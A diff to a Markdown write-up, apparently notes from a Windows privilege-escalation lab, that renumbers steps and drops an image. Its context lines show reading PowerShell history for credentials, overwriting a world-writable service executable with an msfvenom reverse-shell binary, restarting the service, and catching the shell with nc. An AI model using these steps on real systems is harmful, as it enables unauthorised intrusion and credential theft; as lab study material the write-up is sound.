@@ -68,8 +68,6 @@ type "%userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\Cons
 cat "$Env:userprofile\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"
 ```
 
-![image.png](attachment:4a9b5df7-725a-4151-ada5-b4119405fd94:image.png)
-
 <img width="1513" height="581" alt="Screenshot 2025-08-13 140105" src="https://github.com/user-attachments/assets/f7b9b2ea-9468-4308-b66b-29f8099c1be3" />
 
 ### **3. Saved Windows Credentials (cmdkey & runas)**
@@ -330,7 +328,7 @@ C:\Users\thm-unpriv>
 
 The Everyone group has modify permissions (M) on the service's executable. This means we can overwrite it with any malicious payload, and the service will execute it with the privileges of the configured user account.
 
-1. **Replace Executable**
+**3. Replace Executable**
 
 ```bash
 root@ip-10-10-213-107:~# msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.213.107 LPORT=4445 -f exe-service -o rev-svc.exe
@@ -360,7 +358,7 @@ processed file: WService.exe
 Successfully processed 1 files; Failed processing 0 files
 ```
 
-1. **Trigger Execution**
+**4. Trigger Execution**
 
 ```bash
 C:\PROGRA~2\SYSTEM~1>sc stop windowsscheduler
@@ -388,7 +386,7 @@ SERVICE_NAME: windowsscheduler
         FLAGS              :
 ```
 
-1. **Catch the reverse shell** 
+**5. Catch the reverse shell** 
 
 ```bash
 root@ip-10-10-213-107:~# rlwrap nc -lvnp 4445
